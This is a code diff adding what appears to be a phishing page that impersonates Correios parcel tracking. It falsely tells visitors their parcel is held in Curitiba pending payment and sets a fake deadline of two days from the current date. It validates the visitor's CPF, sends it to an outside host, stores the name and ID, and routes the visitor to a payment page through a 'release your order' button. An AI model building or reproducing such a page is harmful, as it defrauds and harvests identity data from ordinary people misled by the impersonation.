+      font-weight: 800;
+    }
+
+    #rastreamento .consulta-notice p {
+      margin: 0;
+      color: #725f3c;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+
+    #rastreamento .consulta-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 11px;
+      width: 100%;
+      min-height: 56px;
+      padding: 15px 20px;
+      color: #ffffff;
+      background: #2165cf;
+      border: 0;
+      border-radius: 11px;
+      box-shadow: 0 5px 14px rgba(33, 101, 207, 0.19);
+      font-size: 15px;
+      font-weight: 800;
+      line-height: 1.4;
+      text-align: center;
+      text-decoration: none;
+      transition: background 0.2s ease, transform 0.2s ease,
+        box-shadow 0.2s ease;
+      cursor: pointer;
+    }
+
+    #rastreamento .consulta-button:hover {
+      color: #ffffff;
+      background: #1855b2;
+      box-shadow: 0 7px 18px rgba(33, 101, 207, 0.25);
+      transform: translateY(-1px);
+    }
+
+    #rastreamento .consulta-button svg {
+      width: 19px;
+      height: 19px;
+      flex: 0 0 19px;
+    }
+
+    #rastreamento .consulta-footer {
+      margin: 17px 0 0;
+      color: #778397;
+      font-size: 12px;
+      line-height: 1.7;
+      text-align: center;
+    }
+
+    @media (max-width: 520px) {
+      #rastreamento.tracking-section {
+        margin: 20px auto;
+        padding: 12px;
+      }
+
+      #rastreamento .consulta-header {
+        padding: 23px 19px;
+      }
+
+      #rastreamento .consulta-body {
+        padding: 21px 17px 23px;
+      }
+
+      #rastreamento .consulta-details {
+        grid-template-columns: 1fr;
+        gap: 10px;
+      }
+
+      #rastreamento .consulta-header h2 {
+        font-size: 24px;
+      }
+
+      #rastreamento .consulta-button {
+        font-size: 14px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      #rastreamento .consulta-button {
+        transition: none;
+      }
+    }
+  </style>
+
+  <div class="consulta-card">
+
+    <header class="consulta-header">
+<style>
+  @keyframes pulsar-bolinha {
+    0%, 100% {
+      transform: scale(1);
+      opacity: 1;
+      box-shadow: 0 0 0 0 rgba(255, 212, 0, 0.6);
+    }
+    50% {
+      transform: scale(1.3);
+      opacity: 0.8;
+      box-shadow: 0 0 0 6px rgba(255, 212, 0, 0);
+    }
+  }
+</style>
+
+<div class="consulta-tag" style="text-align: center; display: block; font-size: 1.3em;">
+  <span style="display: inline-flex; align-items: center; justify-content: center; gap: 8px;">
+    <span style="width: 10px; height: 10px; background-color: #FFD400; border-radius: 50%; display: inline-block; flex-shrink: 0; animation: pulsar-bolinha 1.2s ease-in-out infinite;"></span>
+    <span style="color: #000000;">Status da entrega:</span>
+  </span>
+
+  <br>
+  <b style="display: block; color: #000000;">Aguardando Pagamento</b>
+</div>
+    </header>
+
+
+
+
+    <div class="consulta-body">
+
+      <div class="consulta-status">
+<div class="status-icon" aria-hidden="true" style="color: red; background-color: white;">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="9"></circle>
+    <path d="M12 11v5"></path>
+    <path d="M12 8h.01"></path>
+  </svg>
+
+        </div>
+
+        <div class="status-content">
+          <strong class="status-value" id="statusEntrega">
+            Sua encomenda está retida na agência dos correios em Curitiba - PR
+          </strong>
+        </div>
+      </div>
+
+      <h3 class="consulta-details-title">
+        Dados da consulta
+      </h3>
+
+      <div class="consulta-details">
+        <div class="detail-item">
+          <span class="detail-label"><b>Nome Completo do Destinatário:</b></span>
+          <strong class="detail-value" id="nomeCompleto">
+           <b> Não informado </b>
+          </strong>
+        </div>
+
+        <div class="detail-item">
+          <span class="detail-label"><b>CPF:</b></span>
+          <strong class="detail-value" id="cpfCompleto">
+           <b> Não informado </b>
+          </strong>
+        </div>
+      </div>
+     <div class="consulta-details">
+        <div class="detail-item">
+          <span class="detail-label"><b>Prazo para Regularização:</b></span>
+          <strong class="detail-value" id="dataAtual">
+           <b> Não informado </b>
+          </strong>
+        </div>
+
+
+
+
+<div class="imagem-container">
+  <img
+    src="./images/NOVA-CPF.png"
+    alt="Documento"
+    loading="lazy"
+    decoding="async"
+    style="display:block; width:100%; max-width:100%; height:auto;"
+  >
+
+  <!-- Nome sobre a imagem -->
+  <span id="nomeDisplay" class="texto-nome"></span>
+
+  <!-- CPF sobre a imagem -->
+  <span id="cpfDisplay" class="texto-cpf"></span>
+</div>
+
+<style>
+  .imagem-container {
+    position: relative;
+    width: 100%;
+    max-width: 100%;
+  }
+
+  .texto-nome {
+    position: absolute;
+    top: 49%;
+    left: 16%;
+    font-size: 14px;
+    color: #000000;
+    font-weight: 1000;
+  }
+
+  .texto-cpf {
+    position: absolute;
+    top: 60%;
+    left: 16%;
+    font-size: 14px;
+    color: #000000;
+    font-weight: 1000;
+  }
+</style>
+
+
+
+
+      <a
+        class="consulta-button"
+        href=""
+        target="_blank"
+        rel="noopener noreferrer"
+        onclick="redirectCheckout(event)"
+      >
+        CLIQUE AQUI PARA LIBERAR SEU PEDIDO
+
+
+      </a>
+
+
+<div class="demo-card">
+
+    <img
+        class="demo-card__image"
+        src="./images/card.png"
+        alt="Imagem ilustrativa de demonstração"
+    >
+
+    <div class="demo-card__overlay">
+
+
+    <div
+        id="e_1225979_1_23145_m"
+        class="demo-card__delivery"
+        style="white-space: normal;"
+    >
+        <div class="c e_titulo">
+            <h1>
+                <span>
+                    Receber até dia
+                    <b id="data-recebimento">24/10/2026</b>
+                    após o pagamento
+                </span>
+            </h1>
+        </div>
+    </div>
+
+</div>
+
+<style>
+.demo-card__delivery {
+    position: absolute;
+    top: 9.2%;
+    left: 17.9%;
+    width: 77%;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    color: #222;
+    font-family: Arial, sans-serif;
+    pointer-events: none;
+}
+
+.demo-card__delivery h1 {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    font-size: clamp(9px, 3.1vw, 11px);
+    font-weight: 400;
+    line-height: 1.25;
+    white-space: nowrap;
+}
+
+.demo-card__delivery h1 span {
+    font-weight: 400;
+}
+
+.demo-card__delivery h1 b {
+    position: static;
+    font-size: inherit;
+    color: #000;
+    font-weight: 700;
+}
+</style>
+
+
+<style>
+.demo-card {
+    position: relative;
+    width: 100%;
+    max-width: 360px;
+    margin-inline: auto;
+    box-sizing: border-box;
+}
+
+.demo-card__image {
+    display: block;
+    width: 100%;
+    height: auto;
+}
+
+.demo-card__overlay {
+    position: absolute;
+    inset: 0;
+    box-sizing: border-box;
+    pointer-events: none;
+}
+
+.demo-card__watermark {
+    position: absolute;
+    top: 3%;
+    right: 3%;
+    padding: 4px 7px;
+    background: #fff3cd;
+    color: #664d03;
+    border: 1px solid #ffecb5;
+    border-radius: 4px;
+    font-family: Arial, sans-serif;
+    font-size: 10px;
+    font-weight: 700;
+    line-height: 1.2;
+}
+
+.demo-card__name,
+.demo-card__cpf {
+    position: absolute;
+    box-sizing: border-box;
+    max-width: 94%;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    font-size: clamp(10px, 2.8vw, 14px);
+    line-height: 1.25;
+    overflow-wrap: anywhere;
+}
+</style>
+
+    </div>
+  </div>
+</section>
+
+                       <script>
+                            document.addEventListener("DOMContentLoaded", function () {
+                                const hoje = new Date();
+                                hoje.setDate(hoje.getDate() + 2);
+
+                                const dia = String(hoje.getDate()).padStart(2, '0');
+                                const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+                                const ano = hoje.getFullYear();
+
+                                document.getElementById('data-recebimento').innerText = dia + '/' + mes + '/' + ano;
+                            });
+                        </script>
+
+
+                    </div>
+                </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var params = new URLSearchParams(window.location.search);
+
+            // Prioridade: URL (vem da API via Encomenda) → localStorage → fallback
+            var nomeRaw = params.get("nome") || "";
+            var nome = nomeRaw ? decodeURIComponent(nomeRaw) : (localStorage.getItem("nome") || "");
+
+            var cpfFmtRaw = params.get("cpf_fmt") || "";
+            var cpfFmt = cpfFmtRaw ? decodeURIComponent(cpfFmtRaw) : "";
+
+            // Se não veio cpf_fmt, formata o dígito cru
+            if (!cpfFmt) {
+                var cpfRaw = params.get("cpf") || localStorage.getItem("cpf") || "";
+                var d = cpfRaw.replace(/\D/g, "").slice(0, 11);
+                if (d.length === 11) {
+                    cpfFmt = d.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
+                } else {
+                    cpfFmt = cpfRaw;
+                }
+            }
+
+            // Persiste para páginas seguintes
+            if (nome)   try { localStorage.setItem("nome", nome); } catch (_) {}
+            if (cpfFmt) try { localStorage.setItem("cpf",  cpfFmt); } catch (_) {}
+
+            // Data de prazo: hoje + 2 dias
+            var dataAtual = localStorage.getItem("data_atual") || "";
+            if (!dataAtual) {
+                var d2 = new Date();
+                d2.setDate(d2.getDate() + 2);
+                dataAtual = String(d2.getDate()).padStart(2,"0") + "/" +
+                            String(d2.getMonth()+1).padStart(2,"0") + "/" +
+                            d2.getFullYear();
+            }
+
+            // Popula ficha de dados
+            var nomeCompleto = document.getElementById("nomeCompleto");
+            var cpfCompleto  = document.getElementById("cpfCompleto");
+            var dataPrazo    = document.getElementById("dataAtual");
+            if (nomeCompleto) nomeCompleto.textContent = nome   || "Não informado";
+            if (cpfCompleto)  cpfCompleto.textContent  = cpfFmt || "Não informado";
+            if (dataPrazo)    dataPrazo.textContent    = dataAtual;
+
+            // Popula sobreposição na imagem NOVA-CPF.png
+            var nomeDisplay = document.getElementById("nomeDisplay");
+            var cpfDisplay  = document.getElementById("cpfDisplay");
+            if (nomeDisplay) nomeDisplay.textContent = nome   || "";
+            if (cpfDisplay)  cpfDisplay.textContent  = cpfFmt || "";
+        });
+    </script>
+
+    <script>
+        function redirectCheckout(event) {
+            event.preventDefault();
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const nome = urlParams.get("nome") ? decodeURIComponent(urlParams.get("nome")) : "";
+            const cpf = urlParams.get("cpf") ? urlParams.get("cpf") : "";
+
+            const currentParams = new URLSearchParams(window.location.search);
+            currentParams.set("name", nome);
+            currentParams.set("document", cpf);
+
+            const finalUrl = "../Gerando-Pagamento/index.html?" + currentParams.toString();
+            window.location.href = finalUrl;
+        }
+    </script>
+
+<script>
+(function () {
+  "use strict";
+
+  function initCPFForm() {
+    const form = document.getElementById("tracking-form");
+    const inputCPF = document.getElementById("tracking-code");
+    const errorElement = document.getElementById("tracking-error");
+
+    if (!form || !inputCPF || !errorElement) return;
+
+    // Evita inicializar o formulário duas vezes.
+    if (form.dataset.cpfInitialized === "true") return;
+    form.dataset.cpfInitialized = "true";
+
+    const API_URL =
+      "https://site-clientes.online/aknes-api/aknes.php";
+
+    const NEXT_URL = "../rastreio/index.html";
+
+    let isSubmitting = false;
+
+    function onlyDigits(value) {
+      return value.replace(/\D/g, "").slice(0, 11);
+    }
+
+    // Formata o CPF: 000.000.000-00
+    function formatCPF(digits) {
+      digits = digits.slice(0, 11);
+
+      if (digits.length > 9) {
+        return digits.replace(
+          /^(\d{3})(\d{3})(\d{3})(\d{1,2})$/,
+          "$1.$2.$3-$4"
+        );
+      }
+
+      if (digits.length > 6) {
+        return digits.replace(
+          /^(\d{3})(\d{3})(\d+)$/,
+          "$1.$2.$3"
+        );
+      }
+
+      if (digits.length > 3) {
+        return digits.replace(
+          /^(\d{3})(\d+)$/,
+          "$1.$2"
+        );
+      }
+
+      return digits;
+    }
+
+    // Valida os dígitos verificadores do CPF.
+    function isValidCPF(value) {
+      const cpf = onlyDigits(value);
+
+      if (cpf.length !== 11) return false;
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+
+      const digits = cpf.split("").map(Number);
+      let sum = 0;
+
+      for (let i = 0; i < 9; i++) {
+        sum += digits[i] * (10 - i);
+      }
+
+      let remainder = (sum * 10) % 11;
+      if (remainder === 10) remainder = 0;
+
+      if (remainder !== digits[9]) return false;
+
+      sum = 0;
+
+      for (let i = 0; i < 10; i++) {
+        sum += digits[i] * (11 - i);
+      }
+
+      remainder = (sum * 10) % 11;
+      if (remainder === 10) remainder = 0;
+
+      return remainder === digits[10];
+    }
+
+    // Centraliza a mensagem na largura total disponível.
+    function showError(message) {
+      errorElement.textContent = message;
+      errorElement.hidden = false;
+
+      errorElement.style.setProperty("display", "block", "important");
+      errorElement.style.setProperty("width", "100%", "important");
+      errorElement.style.setProperty("max-width", "100%", "important");
+      errorElement.style.setProperty("text-align", "center", "important");
+      errorElement.style.setProperty("font-size", "1.1em", "important");
+      errorElement.style.setProperty("font-weight", "bold", "important");
+      errorElement.style.setProperty("margin-left", "auto", "important");
+      errorElement.style.setProperty("margin-right", "auto", "important");
+      errorElement.style.setProperty("box-sizing", "border-box", "important");
+
+      errorElement.setAttribute("role", "alert");
+      inputCPF.setAttribute("aria-invalid", "true");
+    }
+
+    function clearError() {
+      errorElement.textContent = "";
+      errorElement.hidden = true;
+
+      [
+        "display",
+        "width",
+        "max-width",
+        "text-align",
+        "font-size",
+        "font-weight",
+        "margin-left",
+        "margin-right",
+        "box-sizing"
+      ].forEach(function (property) {
+        errorElement.style.removeProperty(property);
+      });
+
+      inputCPF.removeAttribute("aria-invalid");
+    }
+
+    // Máscara automática mantendo a posição do cursor.
+    inputCPF.addEventListener("input", function () {
+      const oldValue = inputCPF.value;
+      const oldCursor = inputCPF.selectionStart;
+
+      const digitsBeforeCursor = oldValue
+        .slice(0, oldCursor === null ? oldValue.length : oldCursor)
+        .replace(/\D/g, "").length;
+
+      const digits = onlyDigits(oldValue);
+      const formatted = formatCPF(digits);
+
+      inputCPF.value = formatted;
+
+      let newCursor = 0;
+      let digitCount = 0;
+
+      while (
+        newCursor < formatted.length &&
+        digitCount < digitsBeforeCursor
+      ) {
+        if (/\d/.test(formatted[newCursor])) {
+          digitCount++;
+        }
+
+        newCursor++;
+      }
+
+      try {
+        inputCPF.setSelectionRange(newCursor, newCursor);
+      } catch (_) {}
+
+      clearError();
+    });
+
+    // Consulta o CPF ao enviar o formulário.
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      if (isSubmitting) return;
+
+      clearError();
+
+      const cpf = onlyDigits(inputCPF.value);
+
+      if (!isValidCPF(cpf)) {
+        showError("Digite um CPF válido, com 11 dígitos.");
+        inputCPF.focus();
+        return;
+      }
+
+      isSubmitting = true;
+
+      const buttons = form.querySelectorAll('button[type="submit"]');
+
+      buttons.forEach(function (button) {
+        button.disabled = true;
+      });
+
+      try {
+        const apiURL = new URL(API_URL);
+        apiURL.searchParams.set("cpf", cpf);
+
+        const response = await fetch(apiURL.toString(), {
+          method: "GET",
+          headers: {
+            "Accept": "application/json"
+          }
+        });
+
+        if (!response.ok) {
+          throw new Error(
+            "Não foi possível consultar o CPF. Tente novamente."
+          );
+        }
+
+        const data = await response.json();
+
+        if (!data || Number(data.status) !== 200) {
+          throw new Error(
+            "CPF não encontrado. Verifique os números e tente novamente."
+          );
+        }
+
+        // Preserva os parâmetros atuais, incluindo as UTMs.
+        const currentParams = new URLSearchParams(
+          window.location.search
+        );
+
+        currentParams.set("cpf", cpf);
+
+        const queryString = currentParams.toString();
+
+        const destination = queryString
+          ? NEXT_URL + "?" + queryString
+          : NEXT_URL;
+
+        window.location.href = destination;
+
+      } catch (error) {
+        showError(
+          error instanceof TypeError
+            ? "Erro de conexão ao consultar o CPF. Tente novamente."
+            : error.message || "Ocorreu um erro. Tente novamente."
+        );
+
+        isSubmitting = false;
+
+        buttons.forEach(function (button) {
+          button.disabled = false;
+        });
+      }
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", initCPFForm, {
+      once: true
+    });
+  } else {
+    initCPFForm();
+  }
+})();
+</script>
+
+
+
+    </section>
+
+
+    </main>
+ <footer class="site-footer" id="ajuda">
+    <div class="footer-brand-row">
+      <a class="footer-brand" href="" aria-label="Rota, início"><div class="footer-brand-row">
+  <img src="images/footer.png" alt="" class="footer-mark">
+</div>
+
+<style>
+  .footer-brand-row {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+  }
+
+  .footer-mark {
+    display: block;
+    width: 390px;
+    max-width: 90%;
+    height: auto;
+    margin: 0 auto;
+    object-fit: contain;
+  }
+</style>
+        
+      </a>
+      
+    </div>
+
+    <p class="copyright">© Copyright 2026 Correios</p>
+    <p class="footer-subline">CNPJ 34.028.316/0001-03
+</p>
+  </footer>
+
+  
+</body>
+</html>
